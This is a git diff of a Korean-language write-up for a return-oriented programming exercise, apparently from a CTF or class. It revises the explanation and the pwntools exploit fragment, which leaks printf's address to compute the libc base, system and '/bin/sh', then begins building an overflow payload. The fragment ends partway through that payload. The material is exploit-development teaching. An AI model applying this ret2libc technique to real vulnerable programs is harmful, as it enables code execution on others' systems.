@@ -24,8 +24,7 @@ p.interactive()
 
 ## problem 3
 
-ROP 문제로, 주어진 one gadget을 활용할 수 있다.
-
+ROP 문제로, 주어진 printf 함수의 실제 주소를 활용하여 system과 '/bin/sh'의 주소를 찾을 수 있다.
 
 ```python
 
@@ -39,13 +38,18 @@ binsh = 0x68732f6e6962
 p.recvuntil(b'printf Function is at: ')
 printf_addr = int(p.recv(14), 16)
 
-
 libc_base = printf_addr - e.symbols['printf']
 
+
+log.info("libc base : %s"%hex(libc_base))
 system_addr = libc_base + e.symbols['system']
-binsh = libc_base + list(e.search('/bin/sh'))[0]
 
 log.info("system addr : %s"%hex(system_addr))
+
+binsh = libc_base + list(e.search('/bin/sh'))[0]
+
+
+
 
 payload = b'A'*0x20
 payload += b'B'*0x4
